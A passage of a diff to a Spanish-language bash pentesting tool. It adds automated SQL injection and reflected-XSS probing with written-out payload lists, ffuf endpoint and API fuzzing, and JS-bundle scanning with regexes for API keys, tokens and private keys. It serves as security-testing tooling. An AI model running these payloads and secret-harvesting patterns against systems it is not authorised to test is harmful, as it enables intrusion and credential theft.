@@ -1,20 +1,20 @@
 #!/usr/bin/env bash
 #
 # ╔══════════════════════════════════════════════════════════════╗
-# ║   WriestTavo v2.0 :: by WRIΞSTTAV0                           ║
+# ║   WriestTavo v2.0 :: by WRIΞSTTAV0                          ║
 # ║   Bug Bounty | Pentesting | Análisis de Vulnerabilidades     ║
 # ║                                                              ║
 # ║   MÓDULOS:                                                   ║
-# ║   [1] TTL / OS Fingerprinting                                ║
-# ║   [2] Port Discovery (Fast SYN)                              ║
-# ║   [3] Service & Version Fingerprinting                       ║
-# ║   [4] Web Recon  (whatweb, nikto, gobuster)                  ║
-# ║   [5] Subdomain Enumeration  (subfinder / amass)             ║
-# ║   [6] WAF Detection  (wafw00f)                               ║
-# ║   [7] HTTP Headers Analysis                                  ║
-# ║   [8] SMB Enumeration  (enum4linux-ng)                       ║
-# ║   [9] Vulnerability Scan  (nmap vuln + searchsploit)         ║
-# ║  [10] Reporte HTML profesional                               ║
+# ║   [1] TTL / OS Fingerprinting                               ║
+# ║   [2] Port Discovery (Fast SYN)                             ║
+# ║   [3] Service & Version Fingerprinting                      ║
+# ║   [4] Web Recon  (whatweb, nikto, gobuster)                 ║
+# ║   [5] Subdomain Enumeration  (subfinder / amass)            ║
+# ║   [6] WAF Detection  (wafw00f)                              ║
+# ║   [7] HTTP Headers Analysis                                 ║
+# ║   [8] SMB Enumeration  (enum4linux-ng)                      ║
+# ║   [9] Vulnerability Scan  (nmap vuln + searchsploit)        ║
+# ║  [10] Reporte HTML profesional                              ║
 # ╚══════════════════════════════════════════════════════════════╝
 
 set -uo pipefail
@@ -64,8 +64,8 @@ show_banner() {
     echo -e "${C_BLU}"
     echo "  ██████████████████████████████████████████████████████"
     echo "  █                                                    █"
-    echo "  █   WriestTavo v2.0  ::  WRIΞSTTAV0                  █"
-    echo "  █   Bug Bounty | Pentesting | Vuln Analysis          █"
+    echo "  █   WriestTavo v2.0  ::  WRIΞSTTAV0                 █"
+    echo "  █   Bug Bounty | Pentesting | Vuln Analysis         █"
     echo "  █                                                    █"
     echo "  ██████████████████████████████████████████████████████"
     echo -e "${C_RST}"
@@ -146,21 +146,79 @@ modulo_ttl_os() {
 
 # ─── MÓDULO 2: PORT DISCOVERY ───────────────────────────────────
 modulo_port_scan() {
-    log "MÓDULO 2: Port Discovery (SYN Scan)"
+    log "MÓDULO 2: Port Discovery (SYN Scan — 2 fases)"
 
-    local min_rate=3000
-    local extra_flags="-n -Pn"
-    [[ "$SCAN_MODE" == "stealth" ]]     && min_rate=200  && extra_flags="-n -Pn -T2"
-    [[ "$SCAN_MODE" == "aggressive" ]]  && min_rate=5000 && extra_flags="-n -Pn -T5"
+    # ── Configuración por modo ──────────────────────────────────
+    local min_rate_fast min_rate_full extra_flags top_ports
+    case "$SCAN_MODE" in
+        stealth)
+            min_rate_fast=500;  min_rate_full=300
+            extra_flags="-n -Pn -T2"; top_ports=500
+            tip "Modo STEALTH: fase 1 = top-${top_ports} puertos (silencioso y rápido)."
+            ;;
+        aggressive)
+            min_rate_fast=8000; min_rate_full=6000
+            extra_flags="-n -Pn -T5"; top_ports=1000
+            ;;
+        *)  # normal
+            min_rate_fast=3000; min_rate_full=2000
+            extra_flags="-n -Pn -T4"; top_ports=1000
+            ;;
+    esac
 
-    local cmd="nmap ${extra_flags} -sS --open -p- --min-rate ${min_rate} ${TARGET}"
-    cmd_show "$cmd"
+    # ── FASE A: Top-ports (rápido, siempre corre) ───────────────
+    echo -e "  ${C_CYN}▶ Fase A — Top ${top_ports} puertos (rápido)${C_RST}"
+    local cmd_a="nmap ${extra_flags} -sS --open --top-ports ${top_ports} --min-rate ${min_rate_fast} ${TARGET}"
+    cmd_show "$cmd_a"
 
-    local nmap_out
-    nmap_out=$(nmap ${extra_flags} -sS --open -p- --min-rate ${min_rate} "${TARGET}" 2>/dev/null)
+    local nmap_out_a
+    nmap_out_a=$(nmap ${extra_flags} -sS --open \
+        --top-ports ${top_ports} --min-rate ${min_rate_fast} \
+        "${TARGET}" 2>/dev/null)
 
-    local puertos_nl
-    puertos_nl=$(echo "${nmap_out}" | grep '^[0-9]' | cut -d'/' -f1)
+    local puertos_a
+    puertos_a=$(echo "${nmap_out_a}" | grep '^[0-9]' | cut -d'/' -f1)
+
+    if [[ -n "$puertos_a" ]]; then
+        local csv_a
+        csv_a=$(echo "${puertos_a}" | paste -sd ',' -)
+        ok "Fase A — Puertos encontrados: ${C_YEL}${csv_a}${C_RST}"
+        echo "${nmap_out_a}" > "${OUTPUT_DIR}/nmap/phase_a_top_ports.txt"
+    else
+        warn "Fase A — 0 puertos en top-${top_ports}."
+    fi
+
+    # ── FASE B: Todos los puertos (background, opcional) ────────
+    echo
+    echo -e "  ${C_CYN}▶ Fase B — Escaneo completo -p- (65535 puertos)${C_RST}"
+    echo -e "  ${C_YEL}  Esto puede tardar varios minutos.${C_RST}"
+    echo -ne "  ${C_YEL}¿Ejecutar escaneo completo en segundo plano? [s/N]: ${C_RST}"
+    read -r run_full
+
+    local nmap_out_b=""
+    local puertos_b=""
+    if [[ "${run_full,,}" =~ ^(s|si|y|yes|1)$ ]]; then
+        local cmd_b="nmap ${extra_flags} -sS --open -p- --min-rate ${min_rate_full} ${TARGET}"
+        cmd_show "$cmd_b"
+        local bg_file="${OUTPUT_DIR}/nmap/phase_b_fullscan.txt"
+        nmap ${extra_flags} -sS --open -p- --min-rate ${min_rate_full} \
+            "${TARGET}" > "${bg_file}" 2>/dev/null &
+        local bg_pid=$!
+        echo -e "  ${C_GRN}[PID ${bg_pid}] Escaneo completo corriendo en background.${C_RST}"
+        echo -e "  ${C_DIM}  Resultado en: ${bg_file}${C_RST}"
+        echo -e "  ${C_DIM}  Seguimiento: tail -f ${bg_file}${C_RST}"
+        add_finding "INFO" "Escaneo Completo (background)" "PID=${bg_pid} → ${bg_file}"
+    else
+        warn "Escaneo completo omitido. Continuando con resultados de Fase A."
+    fi
+
+    # ── Consolidar puertos ──────────────────────────────────────
+    local all_ports
+    all_ports=$(echo -e "${puertos_a}\n${puertos_b}" | grep -v '^$' | sort -un)
+
+    local nmap_out="${nmap_out_a}"
+
+    local puertos_nl="$all_ports"
 
     if [[ -z "${puertos_nl}" ]]; then
         # Si vino una URL original, inferir puertos web desde el protocolo
@@ -512,6 +570,791 @@ modulo_searchsploit() {
     echo
 }
 
+# ─── MÓDULO 13: SQL INJECTION BÁSICO ────────────────────────────
+modulo_sqli() {
+    [[ ${#WEB_PORTS[@]} -eq 0 ]] && warn "Sin puertos web. Saltando SQLi." && return
+
+    log "MÓDULO 13: SQL Injection — Pruebas Básicas (curl)"
+    tip "Se prueban payloads básicos en parámetros GET. No reemplaza sqlmap, pero da señales rápidas."
+
+    local proto="http"
+    local port="${WEB_PORTS[0]}"
+    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
+    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
+    local output_file="${OUTPUT_DIR}/web/sqli_results.txt"
+    local vuln_count=0
+    local findings_detail=""
+
+    # Payloads básicos de detección
+    local PAYLOADS=(
+        "'"
+        "'--"
+        "' OR '1'='1"
+        "' OR 1=1--"
+        "\" OR \"1\"=\"1"
+        "1' ORDER BY 1--"
+        "1' ORDER BY 999--"
+        "' AND SLEEP(2)--"
+        "1; SELECT SLEEP(2)--"
+        "' AND 1=CONVERT(int,@@version)--"
+        "' UNION SELECT NULL--"
+        "' UNION SELECT NULL,NULL--"
+        "admin'--"
+        "' OR 'x'='x"
+    )
+
+    # Errores típicos de BD que indican SQLi
+    local DB_ERRORS=(
+        "you have an error in your sql"
+        "warning: mysql"
+        "unclosed quotation mark"
+        "quoted string not properly terminated"
+        "odbc sql server driver"
+        "microsoft ole db provider"
+        "ora-01756"
+        "sqlite_error"
+        "pg_query"
+        "postgresql.*error"
+        "syntax error.*sql"
+        "microsoft jet database"
+        "division by zero"
+    )
+
+    echo -e "  Base URL: ${C_CYN}${base_url}${C_RST}"
+    echo -e "  Payloads: ${#PAYLOADS[@]} | Errores monitoreados: ${#DB_ERRORS[@]}"
+    echo
+
+    # Buscar parámetros GET en la página principal
+    local page_links
+    page_links=$(curl -skL --max-time 10 "${base_url}" 2>/dev/null | \
+        grep -oE '(href|action|src)="[^"]*\?[^"]*"' | \
+        grep -oE '"[^"]*\?[^"]*"' | tr -d '"' | \
+        sed "s|^/|${base_url}/|g" | head -15)
+
+    if [[ -z "$page_links" ]]; then
+        # Si no hay links con params, probar rutas comunes con id=1
+        page_links=$(printf "%s\n%s\n%s\n%s\n%s"             "${base_url}/?id=1"             "${base_url}/index.php?id=1"             "${base_url}/search?q=test"             "${base_url}/product?id=1"             "${base_url}/page?id=1")
+        warn "No se encontraron parámetros GET en la página. Probando rutas genéricas."
+    fi
+
+    echo "${page_links}" | while IFS= read -r url_param; do
+        [[ -z "$url_param" ]] && continue
+        # Extraer la parte base y el parámetro
+        local base_param
+        base_param=$(echo "$url_param" | cut -d'?' -f1)
+        local params
+        params=$(echo "$url_param" | cut -d'?' -f2)
+
+        echo -e "  ${C_DIM}Testeando:${C_RST} ${C_CYN}${url_param}${C_RST}"
+
+        for payload in "${PAYLOADS[@]}"; do
+            local encoded_payload
+            encoded_payload=$(python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1]))" "$payload" 2>/dev/null || echo "$payload")
+
+            local test_url="${base_param}?${params}${encoded_payload}"
+            local response
+            response=$(curl -skL --max-time 8 \
+                -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
+                "${test_url}" 2>/dev/null | tr '[:upper:]' '[:lower:]')
+
+            for err_pattern in "${DB_ERRORS[@]}"; do
+                if echo "$response" | grep -qiE "$err_pattern"; then
+                    local hit="⚠ SQLi POTENCIAL: ${test_url} → Trigger: '${err_pattern}'"
+                    echo -e "  ${C_RED}${hit}${C_RST}"
+                    echo "$hit" >> "${output_file}"
+                    findings_detail+="<tr><td class='vuln'>POTENCIAL</td><td>${test_url}</td><td><code>${payload}</code></td><td>${err_pattern}</td></tr>"
+                    ((vuln_count++)) || true
+                    break
+                fi
+            done
+
+            # Detectar time-based (SLEEP)
+            if [[ "$payload" == *"SLEEP"* ]]; then
+                local start_time end_time elapsed
+                start_time=$(date +%s)
+                curl -skL --max-time 10 \
+                    -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
+                    "${test_url}" >/dev/null 2>&1
+                end_time=$(date +%s)
+                elapsed=$(( end_time - start_time ))
+                if (( elapsed >= 2 )); then
+                    local time_hit="⚠ TIME-BASED SQLi: ${test_url} → Delay: ${elapsed}s"
+                    echo -e "  ${C_RED}${time_hit}${C_RST}"
+                    echo "$time_hit" >> "${output_file}"
+                    findings_detail+="<tr><td class='critical'>TIME-BASED</td><td>${test_url}</td><td><code>${payload}</code></td><td>Delay ${elapsed}s</td></tr>"
+                    ((vuln_count++)) || true
+                fi
+            fi
+        done
+    done
+
+    echo
+    if (( vuln_count > 0 )); then
+        add_finding "CRÍTICO" "SQL Injection — ${vuln_count} Indicios Encontrados" \
+            "<table class='vuln-table'><tr><th>Tipo</th><th>URL</th><th>Payload</th><th>Trigger</th></tr>${findings_detail}</table><br><b>Siguiente paso:</b> Confirmar con <code>sqlmap -u \"URL\" --dbs</code>"
+    else
+        ok "No se detectaron indicios obvios de SQLi básico."
+        add_finding "INFO" "SQL Injection" "No se detectaron errores de BD con payloads básicos. Recomienda: sqlmap completo."
+    fi
+
+    [[ -f "$output_file" ]] && ok "Resultados SQLi: ${output_file}"
+    echo
+}
+
+# ─── MÓDULO 14: XSS BÁSICO ──────────────────────────────────────
+modulo_xss() {
+    [[ ${#WEB_PORTS[@]} -eq 0 ]] && warn "Sin puertos web. Saltando XSS." && return
+
+    log "MÓDULO 14: XSS — Cross-Site Scripting Básico (curl)"
+    tip "Pruebas de reflexión de payloads. Un XSS real requiere navegador para ejecutar."
+
+    local proto="http"
+    local port="${WEB_PORTS[0]}"
+    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
+    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
+    local output_file="${OUTPUT_DIR}/web/xss_results.txt"
+    local vuln_count=0
+    local findings_detail=""
+
+    # Canary token único para esta sesión
+    local CANARY="WTavo$(date +%s)"
+
+    # Payloads XSS — del más simple al más evasivo
+    local XSS_PAYLOADS=(
+        "<script>alert('${CANARY}')</script>"
+        "<img src=x onerror=alert('${CANARY}')>"
+        "<svg onload=alert('${CANARY}')>"
+        "javascript:alert('${CANARY}')"
+        "'><script>alert('${CANARY}')</script>"
+        "\"><img src=x onerror=alert('${CANARY}')>"
+        "<body onload=alert('${CANARY}')>"
+        "<iframe src=\"javascript:alert('${CANARY}')\"></iframe>"
+        "<!--<script>alert('${CANARY}')</script>-->"
+        "<ScRiPt>alert('${CANARY}')</ScRiPt>"
+        "%3Cscript%3Ealert('${CANARY}')%3C/script%3E"
+        "<img src=\"\" onerror=\"alert('${CANARY}')\">"
+        "<details open ontoggle=alert('${CANARY}')>"
+        "<video><source onerror=alert('${CANARY}')>"
+    )
+
+    echo -e "  Base URL: ${C_CYN}${base_url}${C_RST}"
+    echo -e "  Canary token: ${C_YEL}${CANARY}${C_RST}"
+    echo -e "  Payloads: ${#XSS_PAYLOADS[@]}"
+    echo
+
+    # Extraer formularios y parámetros GET
+    local page_html
+    page_html=$(curl -skL --max-time 10 \
+        -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
+        "${base_url}" 2>/dev/null)
+
+    local page_links
+    page_links=$(echo "$page_html" | \
+        grep -oE '(href|action)="[^"]*"' | \
+        grep -oE '"[^"]*"' | tr -d '"' | \
+        grep '?' | sed "s|^/|${base_url}/|g" | head -10)
+
+    # Incluir la URL base con params de prueba
+    local test_urls=("${base_url}/?q=TEST" "${base_url}/search?q=TEST" "${base_url}/?s=TEST")
+    while IFS= read -r u; do [[ -n "$u" ]] && test_urls+=("$u"); done <<< "$page_links"
+
+    for url_template in "${test_urls[@]}"; do
+        local base_part
+        base_part=$(echo "$url_template" | cut -d'?' -f1)
+        local param_part
+        param_part=$(echo "$url_template" | cut -d'?' -f2 | sed 's/=.*//')
+        [[ -z "$param_part" ]] && param_part="q"
+
+        echo -e "  ${C_DIM}Testeando:${C_RST} ${C_CYN}${base_part}?${param_part}=...${C_RST}"
+
+        for payload in "${XSS_PAYLOADS[@]}"; do
+            local encoded
+            encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''${payload}'''))" 2>/dev/null || echo "$payload")
+
+            local test_url="${base_part}?${param_part}=${encoded}"
+            local response
+            response=$(curl -skL --max-time 8 \
+                -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
+                "${test_url}" 2>/dev/null)
+
+            # Verificar si el CANARY se refleja sin encoding
+            if echo "$response" | grep -q "${CANARY}"; then
+                # Verificar si está dentro de un contexto ejecutable
+                local context="reflexión"
+                echo "$response" | grep -q "<script>" && context="dentro de <script>"
+                echo "$response" | grep -q "onerror=" && context="dentro de atributo evento"
+                echo "$response" | grep -q "onload=" && context="dentro de onload"
+
+                local hit="⚠ XSS REFLEJADO: ${base_part}?${param_part}= | Payload: ${payload} | Contexto: ${context}"
+                echo -e "  ${C_RED}${hit}${C_RST}"
+                echo "$hit" >> "${output_file}"
+                local safe_payload="${payload//</LESSTHAN}"; safe_payload="${safe_payload//>/GREATERTHAN}"
+                findings_detail+="<tr><td class='critical'>REFLEJADO</td><td>${base_part}?${param_part}=</td><td><code>${safe_payload}</code></td><td>${context}</td></tr>"
+                ((vuln_count++)) || true
+                break  # Un hit por URL es suficiente para señalar
+            fi
+
+            # Verificar si el payload llega parcialmente (posible bypass de filtro)
+            if echo "$response" | grep -qiE "alert|onerror|onload|<script|<img|<svg"; then
+                if echo "$response" | grep -q "WTavo"; then
+                    warn "Reflexión parcial detectada en: ${test_url}"
+                    findings_detail+="<tr><td class='medium'>PARCIAL</td><td>${base_part}?${param_part}=</td><td><code>${payload}</code></td><td>Reflexion parcial - revisar manualmente</td></tr>"
+                fi
+            fi
+        done
+
+        # Test XSS en headers (User-Agent, Referer, X-Forwarded-For)
+        local header_response
+        header_response=$(curl -skL --max-time 8 \
+            -H "User-Agent: <script>alert('${CANARY}')</script>" \
+            -H "Referer: <script>alert('${CANARY}')</script>" \
+            -H "X-Forwarded-For: <script>alert('${CANARY}')</script>" \
+            "${base_url}" 2>/dev/null)
+
+        if echo "$header_response" | grep -q "${CANARY}"; then
+            local h_hit="⚠ XSS EN HEADER: ${base_url} → Reflexión via HTTP Header"
+            echo -e "  ${C_RED}${h_hit}${C_RST}"
+            echo "$h_hit" >> "${output_file}"
+            findings_detail+="<tr><td class='critical'>HEADER-BASED</td><td>${base_url}</td><td><code>Header injection</code></td><td>User-Agent / Referer / X-Forwarded-For</td></tr>"
+            ((vuln_count++)) || true
+        fi
+    done
+
+    # POST form testing
+    local forms
+    # Extract form action URLs from page HTML
+    local forms_raw
+    forms_raw=$(echo "$page_html" | grep -oi "action='[^']*'\|action=\"[^\"]*\"" | grep -oE "['\"][^'\"]+['\"]" | tr -d "'\""  | head -5)
+    local forms="$forms_raw" 
+    if [[ -n "$forms" ]]; then
+        echo
+        log "Testeando formularios POST para XSS..."
+        while IFS= read -r form_action; do
+            [[ -z "$form_action" ]] && continue
+            [[ "$form_action" != http* ]] && form_action="${base_url}${form_action}"
+            local post_resp
+            post_resp=$(curl -skL --max-time 8 \
+                -X POST \
+                -d "q=<script>alert('${CANARY}')</script>&search=<img src=x onerror=alert('${CANARY}')>&input=${CANARY}" \
+                -H "Content-Type: application/x-www-form-urlencoded" \
+                "${form_action}" 2>/dev/null)
+
+            if echo "$post_resp" | grep -q "${CANARY}"; then
+                local post_hit="⚠ XSS POST: ${form_action}"
+                echo -e "  ${C_RED}${post_hit}${C_RST}"
+                echo "$post_hit" >> "${output_file}"
+                findings_detail+="<tr><td class='critical'>POST FORM</td><td>${form_action}</td><td><code>POST body injection</code></td><td>Reflexión en respuesta POST</td></tr>"
+                ((vuln_count++)) || true
+            fi
+        done <<< "$forms"
+    fi
+
+    echo
+    if (( vuln_count > 0 )); then
+        add_finding "CRÍTICO" "XSS — ${vuln_count} Puntos de Inyección Detectados" \
+            "<table class='vuln-table'><tr><th>Tipo</th><th>URL</th><th>Payload</th><th>Contexto</th></tr>${findings_detail}</table><br><b>Siguiente paso:</b> Confirmar en navegador real. Usar Burp Suite para análisis profundo."
+    else
+        ok "No se detectó XSS reflejado básico."
+        add_finding "INFO" "XSS" "No se detectó reflexión de payloads básicos. Recomienda: Burp Suite Active Scan para XSS almacenado y DOM-based."
+    fi
+
+    [[ -f "$output_file" ]] && ok "Resultados XSS: ${output_file}"
+    echo
+}
+
+# ─── MÓDULO 15: ENDPOINT & API DISCOVERY ────────────────────────
+modulo_endpoints() {
+    [[ ${#WEB_PORTS[@]} -eq 0 ]] && warn "Sin puertos web. Saltando endpoints." && return
+    command -v ffuf >/dev/null 2>&1 || { warn "ffuf no disponible. Instala: sudo apt install ffuf"; return; }
+
+    log "MÓDULO 15: Endpoint & API Discovery (ffuf)"
+    tip "APIs modernas usan rutas como /api/v1/, /graphql, /swagger, /actuator — muy comunes en bug bounty."
+
+    local proto="http"
+    local port="${WEB_PORTS[0]}"
+    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
+    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
+    local output_dir="${OUTPUT_DIR}/web/endpoints"
+    mkdir -p "$output_dir"
+
+    # ── Wordlist de APIs y endpoints modernos ──
+    local API_WORDLIST="${output_dir}/api_endpoints.txt"
+    cat > "$API_WORDLIST" << 'WORDLIST'
+api
+api/v1
+api/v2
+api/v3
+api/user
+api/users
+api/auth
+api/login
+api/register
+api/logout
+api/token
+api/refresh
+api/admin
+api/config
+api/settings
+api/data
+api/search
+api/upload
+api/download
+api/status
+api/health
+api/info
+api/version
+api/debug
+graphql
+graphiql
+playground
+swagger
+swagger-ui
+swagger-ui.html
+swagger.json
+swagger.yaml
+openapi.json
+openapi.yaml
+api-docs
+api-docs.json
+v1
+v2
+v3
+rest
+rest/api
+rpc
+jsonrpc
+soap
+wsdl
+actuator
+actuator/health
+actuator/info
+actuator/env
+actuator/beans
+actuator/mappings
+actuator/metrics
+actuator/dump
+actuator/trace
+actuator/logfile
+actuator/heapdump
+.well-known
+.well-known/security.txt
+.well-known/openid-configuration
+robots.txt
+sitemap.xml
+sitemap_index.xml
+security.txt
+humans.txt
+crossdomain.xml
+clientaccesspolicy.xml
+feed
+feed.xml
+rss
+rss.xml
+atom.xml
+wp-json
+wp-json/wp/v2
+wp-login.php
+wp-admin
+admin
+admin/api
+dashboard
+panel
+console
+manager
+portal
+user
+users
+profile
+account
+auth
+login
+logout
+register
+signup
+signin
+reset
+forgot
+oauth
+oauth/token
+oauth/authorize
+callback
+redirect
+webhook
+webhooks
+upload
+uploads
+files
+static
+assets
+media
+images
+cdn
+socket.io
+ws
+websocket
+health
+ping
+status
+metrics
+monitor
+debug
+test
+dev
+staging
+internal
+private
+backup
+export
+import
+WORDLIST
+
+    echo -e "  Base URL: ${C_CYN}${base_url}${C_RST}"
+    local wl_count; wl_count=$(wc -l < "$API_WORDLIST")
+    echo -e "  Endpoints en wordlist: ${wl_count}"
+    echo
+
+    local ffuf_output="${output_dir}/ffuf_endpoints.json"
+    cmd_show "ffuf -u ${base_url}/FUZZ -w ${API_WORDLIST} -mc 200,201,204,301,302,401,403,405 -t 30 -o ${ffuf_output} -of json -s"
+
+    ffuf -u "${base_url}/FUZZ" \
+        -w "$API_WORDLIST" \
+        -mc 200,201,204,301,302,401,403,405 \
+        -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
+        -H "Accept: application/json, text/html" \
+        -t 30 \
+        -o "${ffuf_output}" \
+        -of json \
+        -s 2>/dev/null
+
+    # Parsear resultados
+    if [[ -f "$ffuf_output" ]]; then
+        local results_txt="${output_dir}/endpoints_found.txt"
+        local ffuf_out_copy="${ffuf_output}"
+        local results_copy="${results_txt}"
+        # Parse ffuf JSON output
+        local results_txt="${output_dir}/endpoints_found.txt"
+        local found_count=0
+        if command -v jq >/dev/null 2>&1; then
+            jq -r '.results[] | "[\(.status)] \(.url) (size:\(.length))"' "${ffuf_output}" 2>/dev/null | tee "${results_txt}"
+            found_count=$(jq '.results | length' "${ffuf_output}" 2>/dev/null || echo 0)
+        else
+            found_count=$(grep -c "url" "${ffuf_output}" 2>/dev/null || echo 0)
+            grep -oE '"url":"[^"]*"' "${ffuf_output}" 2>/dev/null | cut -d'"' -f4 > "${results_txt}" || true
+        fi
+
+        ok "Endpoints/APIs encontrados: ${found_count}"
+
+        if (( found_count > 0 )); then
+            # Clasificar hallazgos por severidad
+            local critical_eps=""
+            local interesting_eps=""
+
+            if [[ -f "$results_txt" ]]; then
+                # Endpoints críticos
+                critical_eps=$(grep -iE "admin|actuator|debug|config|env|heapdump|dump|backup|internal|private|swagger|graphql|api-docs" "$results_txt" 2>/dev/null)
+                # Con 401/403 (existentes pero protegidos)
+                interesting_eps=$(grep -E "\[401\]|\[403\]" "$results_txt" 2>/dev/null | head -20)
+
+                [[ -n "$critical_eps" ]] && add_finding "ALTO" \
+                    "Endpoints Críticos Encontrados" \
+                    "<pre>${critical_eps}</pre><br><b>Tip:</b> Endpoints como /actuator, /admin, /debug pueden exponer datos sensibles."
+
+                [[ -n "$interesting_eps" ]] && add_finding "MEDIO" \
+                    "Endpoints Protegidos (401/403) — Posible Bypass" \
+                    "<pre>${interesting_eps}</pre><br><b>Tip:</b> Prueba bypass con: X-Original-URL, X-Rewrite-URL, ..;/ path traversal."
+
+                local all_eps
+                all_eps=$(cat "$results_txt")
+                add_finding "INFO" "Todos los Endpoints Encontrados (${found_count})" "<pre>${all_eps}</pre>"
+            fi
+        fi
+    fi
+
+    # ── Detección especial: GraphQL ──
+    echo
+    log "Verificando GraphQL..."
+    local gql_endpoints=("/graphql" "/graphiql" "/playground" "/api/graphql" "/v1/graphql")
+    local gql_found=""
+    for ep in "${gql_endpoints[@]}"; do
+        local gql_url="${base_url}${ep}"
+        local gql_resp
+        gql_resp=$(curl -skL --max-time 8 \
+            -X POST \
+            -H "Content-Type: application/json" \
+            -d '{"query":"{__typename}"}' \
+            "${gql_url}" 2>/dev/null)
+
+        if echo "$gql_resp" | grep -qiE "__typename|data|graphql|errors"; then
+            warn "GraphQL DETECTADO: ${gql_url}"
+            gql_found+="${gql_url}\n"
+            add_finding "ALTO" "GraphQL Endpoint Detectado" \
+                "URL: <b>${gql_url}</b><br>Respuesta sugiere GraphQL activo.<br><b>Siguiente paso:</b> graphql-cop -t ${gql_url} o InQL en Burp."
+        fi
+    done
+
+    # ── Detección: Swagger / OpenAPI ──
+    echo
+    log "Verificando Swagger / OpenAPI docs..."
+    local swagger_eps=("/swagger.json" "/swagger.yaml" "/openapi.json" "/api-docs" "/swagger-ui.html" "/v2/api-docs" "/v3/api-docs")
+    for ep in "${swagger_eps[@]}"; do
+        local sw_url="${base_url}${ep}"
+        local sw_status
+        sw_status=$(curl -sko /dev/null --max-time 5 -w "%{http_code}" "${sw_url}" 2>/dev/null)
+        if [[ "$sw_status" == "200" ]]; then
+            ok "Swagger/OpenAPI encontrado: ${sw_url}"
+            add_finding "ALTO" "Swagger/API Docs Expuestos Públicamente" \
+                "URL: <b>${sw_url}</b><br>Los API docs expuestos revelan todos los endpoints, parámetros y modelos de datos.<br><b>Impacto:</b> Facilita reconocimiento completo de la API."
+        fi
+    done
+    echo
+}
+
+# ─── MÓDULO 16: JS/JSX ANALYSIS ─────────────────────────────────
+modulo_js_analysis() {
+    [[ ${#WEB_PORTS[@]} -eq 0 ]] && warn "Sin puertos web. Saltando análisis JS." && return
+
+    log "MÓDULO 16: JavaScript / JSX Analysis"
+    tip "Las apps modernas (React, Vue, Angular) esconden endpoints, tokens y secrets en sus JS bundles."
+
+    local proto="http"
+    local port="${WEB_PORTS[0]}"
+    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
+    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
+    local js_dir="${OUTPUT_DIR}/web/js_analysis"
+    mkdir -p "$js_dir"
+
+    local vuln_count=0
+    local findings_detail=""
+
+    echo -e "  Base URL: ${C_CYN}${base_url}${C_RST}"
+    echo
+
+    # ── PASO 1: Descubrir archivos JS en la página ──
+    log "Paso 1/4: Descubriendo archivos JS..."
+    local page_html
+    page_html=$(curl -skL --max-time 15 \
+        -H "User-Agent: Mozilla/5.0 (compatible; WriestTavo/2.0)" \
+        "${base_url}" 2>/dev/null)
+
+    # Extraer todos los src de scripts
+    local js_files
+    js_files=$(echo "$page_html" | \
+        grep -oE '(src|href)="[^"]*\.js[^"]*"' | \
+        grep -oE '"[^"]*"' | tr -d '"' | \
+        grep -v "^#" | sort -u)
+
+    # También buscar archivos .js en sourcemaps y webpack
+    local sourcemaps
+    sourcemaps=$(echo "$page_html" | grep -oE '//# sourceMappingURL=[^\s]+')
+
+    # Rutas comunes de bundles modernos
+    local COMMON_JS_PATHS=(
+        "/static/js/main.js"
+        "/static/js/bundle.js"
+        "/static/js/app.js"
+        "/assets/index.js"
+        "/assets/app.js"
+        "/dist/bundle.js"
+        "/dist/app.js"
+        "/js/app.js"
+        "/js/main.js"
+        "/build/static/js/main.chunk.js"
+        "/chunk.js"
+        "/runtime-main.js"
+        "/vendor.js"
+        "/app.bundle.js"
+        "/wp-includes/js/jquery/jquery.min.js"
+    )
+
+    local all_js_urls=()
+    while IFS= read -r js; do
+        [[ -z "$js" ]] && continue
+        if [[ "$js" == http* ]]; then
+            all_js_urls+=("$js")
+        else
+            all_js_urls+=("${base_url}/${js#/}")
+        fi
+    done <<< "$js_files"
+
+    # Probar rutas comunes
+    for path in "${COMMON_JS_PATHS[@]}"; do
+        local status
+        status=$(curl -sko /dev/null --max-time 5 -w "%{http_code}" "${base_url}${path}" 2>/dev/null)
+        [[ "$status" == "200" ]] && all_js_urls+=("${base_url}${path}")
+    done
+
+    local js_count="${#all_js_urls[@]}"
+    ok "Archivos JS encontrados: ${js_count}"
+
+    if (( js_count == 0 )); then
+        warn "No se encontraron archivos JS. El site puede usar SSR o no cargar JS externo."
+        add_finding "INFO" "JS Analysis" "No se encontraron archivos JavaScript externos accesibles."
+        return
+    fi
+
+    # ── PASO 2: Descargar y analizar cada JS ──
+    log "Paso 2/4: Descargando y analizando archivos JS..."
+
+    # Patrones paralelos: nombres y regex
+    local PAT_NAMES=(
+        "API Key"
+        "Token JWT"
+        "AWS Access Key"
+        "AWS Secret Key"
+        "Google API Key"
+        "Firebase URL"
+        "Stripe Key"
+        "Private Key PEM"
+        "Password hardcoded"
+        "Token hardcoded"
+        "Endpoint interno"
+        "MongoDB URI"
+        "SQL Connection"
+        "Email hardcoded"
+        "IP interna"
+        "Endpoint API"
+        "Ruta sensible"
+    )
+    local PAT_REGEX=(
+        'api[_-]?key[[:space:]]*[:=][[:space:]]*[[:alnum:]_-]{16,}'
+        'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+'
+        'AKIA[0-9A-Z]{16}'
+        'aws[_-]?secret[_-]?access[_-]?key'
+        'AIza[0-9A-Za-z_-]{35}'
+        'https://[a-z0-9-]+\.firebaseio\.com'
+        'sk_live_[0-9a-zA-Z]{24,}'
+        'BEGIN PRIVATE KEY'
+        'password[[:space:]]*:[[:space:]]*[^[:space:]]{6,}'
+        'auth_token[[:space:]]*=[[:space:]]*[a-zA-Z0-9_-]{20,}'
+        'https?://(internal|localhost|127\.0\.0\.1|192\.168\.[0-9]+\.[0-9]+|10\.[0-9]+\.[0-9]+\.[0-9]+)'
